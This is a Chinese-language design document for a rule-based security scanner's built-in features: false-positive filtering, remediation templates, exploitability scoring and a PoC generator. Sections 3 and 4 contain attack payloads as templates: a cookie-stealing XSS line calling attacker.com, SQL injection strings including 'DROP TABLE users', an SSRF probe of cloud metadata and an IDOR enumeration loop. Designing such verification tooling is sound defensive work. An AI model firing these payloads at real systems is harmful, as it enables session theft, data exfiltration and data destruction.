# Agent 内置增强功能设计

> 无需 AST/LLM/DAST 外部工具，纯基于规则+模板实现

---

## 1. 自动过滤误报 (False Positive Filter)

### 实现思路
基于静态代码规则和模式匹配，自动过滤常见误报场景。

### 核心规则库

#### 规则1: 净化函数检测
```javascript
// engine/false-positive-filter.js
const SANITIZATION_PATTERNS = {
  sql: [
    /PreparedStatement.*set\w+\(/,           // 参数化查询
    /#{\w+}/,                               // MyBatis #{} 语法
    /\$\d+/,                                // PostgreSQL $1 语法
    /escapeString|escapeSql|sanitizeSql/i,  // 净化函数
  ],
  xss: [
    /encodeURIComponent\(/,                  // URL编码
    /escapeHtml|sanitizeHtml|DOMPurify/i,   // HTML净化
    /textContent|innerText\s*=/,           // 安全赋值
  ],
  command: [
    /validateCommand|sanitizeCommand/i,    // 命令净化
    /['"][a-zA-Z0-9_-]+['"]/,               // 硬编码命令
  ]
};

function checkSanitization(sinkCode, vulnType) {
  const patterns = SANITIZATION_PATTERNS[vulnType];
  return patterns.some(p => p.test(sinkCode));
}
```

#### 规则2: 参数来源白名单
```javascript
const SAFE_SOURCES = {
  // 配置项 - 非用户可控
  config: [
    /@Value\s*\(/,                          // Spring配置
    /@ConfigurationProperties/,             // 配置类
    /config\.[a-zA-Z]+/,                   // 配置对象
    /properties\.get\w+\(/,                // 属性获取
  ],
  // 系统生成 - 非用户可控
  system: [
    /UUID\.randomUUID\(\)/,                 // UUID
    /System\.currentTimeMillis\(\)/,        // 时间戳
    /new\s+Date\(\)/,                        // 当前时间
    /LocalDate(Time)?\.now\(\)/,            // Java8时间
  ],
  // 内部计算 - 非用户可控
  internal: [
    /\.hashCode\(\)/,                       // 哈希值
    /\.length\(\)|\.size\(\)/,               // 长度属性
    /StringUtils\.(isEmpty|isBlank)/,       // 空值检查
  ]
};

function checkSafeSource(paramFlow) {
  for (const [category, patterns] of Object.entries(SAFE_SOURCES)) {
    if (patterns.some(p => p.test(paramFlow))) {
      return { isSafe: true, category };
    }
  }
  return { isSafe: false };
}
```

#### 规则3: 死代码检测
```javascript
// 检查方法是否被调用
async function checkDeadCode(methodName, filePath, projectRoot) {
  // 1. 本文件内调用检查
  const fileContent = await readFile(filePath);
  const methodCalls = fileContent.match(new RegExp(`\\b${methodName}\\s*\\(`, 'g')) || [];
  
  // 2. 其他文件调用检查（简化版 - 实际可限制范围）
  const otherCalls = await grepProject(projectRoot, `\\b${methodName}\\s*\\(`);
  
  const totalCalls = methodCalls.length + otherCalls.length;
  
  if (totalCalls <= 1) { // 只有定义处1次
    return { isDead: true, reason: 'NO_CALLERS' };
  }
  
  // 3. 仅测试代码调用检查
  if (otherCalls.every(c => c.file.includes('test') || c.file.includes('Test'))) {
    return { isDead: false, isTestOnly: true, reason: 'TEST_ONLY' };
  }
  
  return { isDead: false };
}
```

#### 规则4: 常量折叠
```javascript
// 检测字符串拼接中的常量
function detectConstantConcatenation(code) {
  // 模式: "prefix" + variable + "suffix" (前缀后缀是常量)
  const constantPattern = /["'][^"'+]+["']\s*\+\s*\w+\s*\+\s*["'][^"'+]+["']/;
  
  // 模式: String.format("template", args) - 模板是常量
  const formatPattern = /String\.format\s*\(\s*["'][^"']+["']/;
  
  return {
    hasConstantPrefix: constantPattern.test(code),
    isSafeFormat: formatPattern.test(code)
  };
}
```

### 集成到 Phase 3
```javascript
// Phase 3 静态验证时调用
async function verifyFalsePositive(vuln) {
  const checks = [];
  
  // 1. 净化检查
  checks.push(checkSanitization(vuln.sinkCode, vuln.type));
  
  // 2. 参数来源检查
  checks.push(checkSafeSource(vuln.paramFlow));
  
  // 3. 死代码检查
  checks.push(await checkDeadCode(vuln.methodName, vuln.filePath));
  
  // 4. 常量折叠检查
  checks.push(detectConstantConcatenation(vuln.sinkCode));
  
  // 综合判断
  if (checks.every(c => c.isSafe || c.isDead)) {
    return { 
      isFalsePositive: true, 
      reason: checks.map(c => c.reason).join('; '),
      originalSeverity: vuln.severity,
      adjustedSeverity: 'INFO'
    };
  }
  
  return { isFalsePositive: false };
}
```

---

## 2. 上下文感知修复建议 (Context-Aware Remediation)

### 实现思路
基于漏洞类型 + 技术栈 + 代码上下文，从模板库匹配最佳修复方案。

### 修复模板库

```javascript
// engine/remediation-templates.js
const REMEDIATION_TEMPLATES = {
  java: {
    sql_injection: {
      // 检测当前代码模式
      detect: [
        { pattern: /\$\{[^}]+\}/, name: 'mybatis_dollar' },  // ${} 拼接
        { pattern: /"[^"]*"\s*\+\s*\w+/, name: 'string_concat' },  // 字符串拼接
        { pattern: /String\.format\s*\(/, name: 'string_format' },
      ],
      // 对应修复方案
      fixes: {
        mybatis_dollar: {
          description: '将 MyBatis ${} 替换为 #{} 参数化查询',
          before: 'SET asset = asset + ${asset}',
          after: 'SET asset = asset + #{asset}',
          explanation: '${} 直接拼接SQL，#{} 使用预编译参数'
        },
        string_concat: {
          description: '使用 PreparedStatement 替代字符串拼接',
          before: `String sql = "SELECT * FROM users WHERE id = " + userId;
stmt.executeQuery(sql);`,
          after: `String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setLong(1, userId);
stmt.executeQuery();`,
          explanation: '使用 ? 占位符和参数绑定，防止SQL注入'
        }
      }
    },
    
    xss: {
      detect: [
        { pattern: /getWriter\(\)\.print\s*\(/, name: 'writer_print' },
        { pattern: /ModelAndView.*addObject\s*\(/, name: 'spring_mvc' },
      ],
      fixes: {
        writer_print: {
          description: '使用 HTML 转义输出',
          before: 'response.getWriter().print(userInput);',
          after: 'response.getWriter().print(HtmlUtils.htmlEscape(userInput));',
          import: 'org.springframework.web.util.HtmlUtils'
        }
      }
    },
    
    hardcoded_key: {
      detect: [
        { pattern: /private\s+static\s+final\s+String\s+\w*[Kk]ey\w*\s*=\s*["'][^"']{16,}["']/, name: 'static_key' },
        { pattern: /@Value\s*\(\s*["'][^"']*password[^"']*["']\)/, name: 'value_password' },
      ],
      fixes: {
        static_key: {
          description: '将硬编码密钥移至配置文件并使用 @Value 注入',
          before: 'private static final String API_KEY = "sk-1234567890abcdef";',
          after: '@Value("${api.key}")\nprivate String apiKey;',
          config: 'api.key=${API_KEY:default}'
        }
      }
    }
  },
  
  vue: {
    dom_xss: {
      detect: [
        { pattern: /v-html\s*=\s*["'][^"']*["']/, name: 'v_html' },
        { pattern: /innerHTML\s*=\s*/, name: 'inner_html' },
      ],
      fixes: {
        v_html: {
          description: '使用 {{ }} 插值替代 v-html',
          before: '<div v-html="userContent"></div>',
          after: '<div>{{ userContent }}</div>',
          note: 'Vue 的 {{ }} 自动进行 HTML 转义'
        }
      }
    }
  }
};

// 模板匹配函数
function matchRemediationTemplate(vuln, language) {
  const templates = REMEDIATION_TEMPLATES[language];
  if (!templates || !templates[vuln.type]) {
    return null;
  }
  
  const vulnTemplates = templates[vuln.type];
  
  // 匹配检测模式
  for (const detector of vulnTemplates.detect) {
    if (detector.pattern.test(vuln.codeSnippet)) {
      return {
        matchedPattern: detector.name,
        ...vulnTemplates.fixes[detector.name]
      };
    }
  }
  
  return null;
}
```

### 集成到报告生成
```javascript
// Phase 6 报告生成时调用
function generateRemediation(vuln) {
  const template = matchRemediationTemplate(vuln, vuln.language);
  
  if (template) {
    return {
      type: 'template_match',
      description: template.description,
      beforeCode: template.before,
      afterCode: template.after,
      explanation: template.explanation,
      additionalImports: template.import || null,
      configChanges: template.config || null
    };
  }
  
  // 回退到通用建议
  return generateGenericRemediation(vuln);
}
```

---

## 3. 漏洞可利用性验证 (Exploitability Verification)

### 实现思路
基于静态分析模拟攻击路径，评估漏洞实际可利用性。

### 核心验证逻辑

```javascript
// engine/exploitability-checker.js

/**
 * 计算漏洞可利用性评分 (0-100)
 */
function calculateExploitability(vuln) {
  let score = 100;
  const factors = [];
  
  // 1. 可达性因子 (0-30分)
  const reachability = assessReachability(vuln);
  score -= (30 - reachability.score);
  factors.push({ name: '可达性', ...reachability });
  
  // 2. 认证因子 (0-25分)
  const auth = assessAuthentication(vuln);
  score -= (25 - auth.score);
  factors.push({ name: '认证要求', ...auth });
  
  // 3. 网络位置因子 (0-20分)
  const network = assessNetworkPosition(vuln);
  score -= (20 - network.score);
  factors.push({ name: '网络位置', ...network });
  
  // 4. 参数可控性因子 (0-15分)
  const controllability = assessParamControllability(vuln);
  score -= (15 - controllability.score);
  factors.push({ name: '参数可控性', ...controllability });
  
  // 5. 前置条件因子 (0-10分)
  const prerequisites = assessPrerequisites(vuln);
  score -= (10 - prerequisites.score);
  factors.push({ name: '前置条件', ...prerequisites });
  
  return {
    exploitabilityScore: Math.max(0, score),
    rating: score >= 70 ? 'HIGH' : score >= 40 ? 'MEDIUM' : 'LOW',
    factors
  };
}

// 可达性评估
function assessReachability(vuln) {
  if (vuln.callChain.length === 0) {
    return { score: 0, reason: '死代码，无调用链' };
  }
  
  const entryPoint = vuln.callChain[0];
  
  // HTTP入口点
  if (/@(RequestMapping|GetMapping|PostMapping|PutMapping|DeleteMapping)/.test(entryPoint)) {
    return { score: 30, reason: 'HTTP入口，直接可达' };
  }
  
  // Feign/RPC调用
  if (/FeignClient|@RPC|@Dubbo/.test(entryPoint)) {
    return { score: 20, reason: '服务间调用，需内部网络' };
  }
  
  // 定时任务
  if (/@Scheduled/.test(entryPoint)) {
    return { score: 10, reason: '定时任务，非用户触发' };
  }
  
  return { score: 15, reason: '内部调用' };
}

// 认证评估
function assessAuthentication(vuln) {
  const annotations = vuln.entryPointAnnotations || [];
  
  // 完全公开
  if (annotations.length === 0 || annotations.includes('@Anonymous')) {
    return { score: 25, reason: '无需认证，公开访问' };
  }
  
  // 需登录
  if (annotations.some(a => /@PreAuthorize.*isAuthenticated/.test(a))) {
    return { score: 15, reason: '需登录用户' };
  }
  
  // 需特定角色
  if (annotations.some(a => /@PreAuthorize.*hasRole/.test(a))) {
    const role = annotations.find(a => /@PreAuthorize.*hasRole/.test(a));
    if (role.includes('ADMIN') || role.includes('admin')) {
      return { score: 5, reason: '需管理员权限' };
    }
    return { score: 10, reason: '需特定角色' };
  }
  
  return { score: 20, reason: '可能需认证' };
}

// 网络位置评估
function assessNetworkPosition(vuln) {
  const entryPath = vuln.entryPointPath || '';
  
  // 公网暴露
  if (/\/api\/|\/public\/|Controller/.test(entryPath)) {
    return { score: 20, reason: '公网API' };
  }
  
  // 管理后台
  if (/\/admin\/|AdminController/.test(entryPath)) {
    return { score: 10, reason: '管理后台，访问受限' };
  }
  
  // 内部服务
  if (/internal|service|rpc/.test(entryPath)) {
    return { score: 5, reason: '内部服务，需内网' };
  }
  
  return { score: 15, reason: '未知网络位置' };
}
```

### 攻击场景模拟
```javascript
// 模拟攻击场景
function simulateAttackScenario(vuln) {
  const scenarios = [];
  
  // SQL注入场景
  if (vuln.type === 'sql_injection') {
    scenarios.push({
      name: '数据提取',
      description: `注入 UNION SELECT 提取其他表数据`,
      payload: `' UNION SELECT username,password FROM users--`,
      requirements: ['参数在查询中', '有回显'],
      likelihood: vuln.paramPosition === 'WHERE' ? 'HIGH' : 'MEDIUM'
    });
    
    scenarios.push({
      name: '权限绕过',
      description: '注入 OR 1=1 绕过认证',
      payload: `' OR '1'='1`,
      requirements: ['参数用于认证查询'],
      likelihood: vuln.sinkMethod?.includes('login') ? 'HIGH' : 'LOW'
    });
  }
  
  // XSS场景
  if (vuln.type === 'xss') {
    scenarios.push({
      name: '会话窃取',
      description: '注入脚本窃取 Cookie',
      payload: `<script>fetch('http://attacker.com/?c='+document.cookie)</script>`,
      requirements: ['Cookie 未标记 HttpOnly', '有XSS回显'],
      likelihood: 'HIGH'
    });
  }
  
  return scenarios;
}
```

---

## 4. PoC 生成器 (PoC Generator)

### 实现思路
基于漏洞类型和上下文，生成可执行的验证脚本。

### PoC 模板库

```javascript
// engine/poc-generator.js
const POC_TEMPLATES = {
  sql_injection: {
    http: {
      curl: (endpoint, param, payload) => `
# SQL注入验证 PoC
curl -X POST "${endpoint}" \\
  -H "Content-Type: application/json" \\
  -d '{"${param}": "${payload}"}'

# 时间盲注验证 (延迟5秒)
curl -X POST "${endpoint}" \\
  -H "Content-Type: application/json" \\
  -d '{"${param}": "'; SELECT pg_sleep(5); --"}'
      `,
      
      python: (endpoint, param, payload) => `
import requests
import time

# SQL注入 PoC
url = "${endpoint}"
data = {"${param}": "${payload}"}

start = time.time()
resp = requests.post(url, json=data)
elapsed = time.time() - start

if elapsed > 4:  # 延迟注入成功
    print(f"[+] 可能存在时间盲注，响应时间: {elapsed:.2f}s")
else:
    print(f"[-] 响应时间正常: {elapsed:.2f}s")
      `
    }
  },
  
  xss: {
    html: (injectionPoint) => `
<!-- XSS PoC -->
<iframe src="${injectionPoint}?input=<script>alert('XSS')</script>">

<!-- 或者使用 img 标签 -->
<img src=x onerror="alert('XSS')">
    `,
    
    javascript: (endpoint, param) => `
// XSS PoC - 在浏览器控制台执行
fetch('${endpoint}', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ ${param}: '<img src=x onerror=alert(1)>' })
}).then(r => r.text()).then(t => console.log(t));
    `
  },
  
  ssrf: {
    curl: (endpoint, param) => `
# SSRF PoC - 探测内网服务
curl "${endpoint}?${param}=http://localhost:22"
curl "${endpoint}?${param}=http://169.254.169.254/latest/meta-data/"  # AWS Metadata
    `
  },
  
  idor: {
    python: (endpoint, idParam) => `
import requests

# IDOR PoC - 遍历ID
for user_id in range(1, 100):
    resp = requests.get(f"${endpoint}?id={user_id}", 
                       headers={"Authorization": "Bearer YOUR_TOKEN"})
    if resp.status_code == 200:
        print(f"[+] ID {user_id} 可访问: {resp.text[:100]}")
    `
  }
};

// 生成 PoC
function generatePoC(vuln, format = 'curl') {
  const template = POC_TEMPLATES[vuln.type]?.[format];
  
  if (!template) {
    return { error: 'No PoC template for this vulnerability type' };
  }
  
  // 提取参数信息
  const endpoint = extractEndpoint(vuln);
  const param = extractParamName(vuln);
  const payload = selectPayload(vuln);
  
  return {
    type: vuln.type,
    format,
    code: template(endpoint, param, payload),
    description: `PoC for ${vuln.type} at ${vuln.filePath}`,
    prerequisites: generatePrerequisites(vuln),
    expectedResult: generateExpectedResult(vuln)
  };
}

// 选择最佳 payload
function selectPayload(vuln) {
  const payloads = {
    sql_injection: [
      "' OR '1'='1",
      "' UNION SELECT null,null,null--",
      "'; DROP TABLE users;--",
      "' AND 1=2 UNION SELECT * FROM information_schema.tables--"
    ],
    xss: [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "javascript:alert(1)",
      "' onmouseover='alert(1)"
    ]
  };
  
  return payloads[vuln.type]?.[0] || 'PAYLOAD_HERE';
}
```

### 集成到报告
```javascript
// 在漏洞详情中附加 PoC
function attachPoCToVuln(vuln) {
  const pocs = [];
  
  // HTTP PoC
  if (vuln.entryPointType === 'HTTP') {
    pocs.push(generatePoC(vuln, 'curl'));
    pocs.push(generatePoC(vuln, 'python'));
  }
  
  // XSS特殊处理
  if (vuln.type === 'xss') {
    pocs.push(generatePoC(vuln, 'html'));
    pocs.push(generatePoC(vuln, 'javascript'));
  }
  
  return {
    ...vuln,
    pocs
  };
}
```

---

## 5. 文件结构设计

```
engine/
├── false-positive-filter.js      # 误报过滤器 (新增)
├── remediation-templates.js    # 修复模板库 (新增)
├── exploitability-checker.js   # 可利用性检查 (新增)
├── poc-generator.js            # PoC生成器 (新增)
├── cvss-scorer.js              # CVSS评分 (已有)
├── attack-path.js              # 攻击路径 (已有)
└── risk-calculator.js          # 业务风险 (已有)

references/
├── false-positive-rules.md     # 误报规则文档 (新增)
├── remediation-guide.md        # 修复指南 (新增)
└── ...
```

---

## 6. 集成到现有流程

### Phase 3 增强
```javascript
// Phase 3: 静态验证
async function phase3StaticVerification(findings) {
  const verified = [];
  
  for (const vuln of findings) {
    // 1. 误报过滤
    const fpCheck = await verifyFalsePositive(vuln);
    if (fpCheck.isFalsePositive) {
      vuln.severity = 'INFO';
      vuln.falsePositiveReason = fpCheck.reason;
    }
    
    // 2. 可利用性评估
    const exploitability = calculateExploitability(vuln);
    vuln.exploitability = exploitability;
    
    // 3. 攻击场景模拟
    vuln.attackScenarios = simulateAttackScenario(vuln);
    
    verified.push(vuln);
  }
  
  return verified;
}
```

### Phase 6 增强
```javascript
// Phase 6: 报告生成
function phase6ReportGeneration(vulns) {
  for (const vuln of vulns) {
    // 1. 生成修复建议
    vuln.remediation = generateRemediation(vuln);
    
    // 2. 生成 PoC
    vuln.pocs = attachPoCToVuln(vuln).pocs;
    
    // 3. CVSS评分 (已有)
    vuln.cvss = calculateCVSS(vuln);
  }
  
  return generateReports(vulns);
}
```

---

## 7. 关键特性对比

| 功能 | 原方案 (外部工具) | 新方案 (Agent内置) | 优势 |
|------|------------------|-------------------|------|
| **误报过滤** | LLM语义分析 | 规则+模式匹配 | 更快、更可控、无API依赖 |
| **修复建议** | LLM生成 | 模板匹配 | 确定性输出、可维护 |
| **可利用性** | DAST实际测试 | 静态评分算法 | 无需运行时环境 |
| **PoC生成** | sqlmap/nuclei | 模板生成代码 | 安全、可审计 |

---

## 8. 实施优先级

1. **P0**: `false-positive-filter.js` - 误报过滤（基础功能）
2. **P1**: `remediation-templates.js` - 修复建议（高价值）
3. **P2**: `exploitability-checker.js` - 可利用性（增强报告）
4. **P2**: `poc-generator.js` - PoC生成（验证辅助）
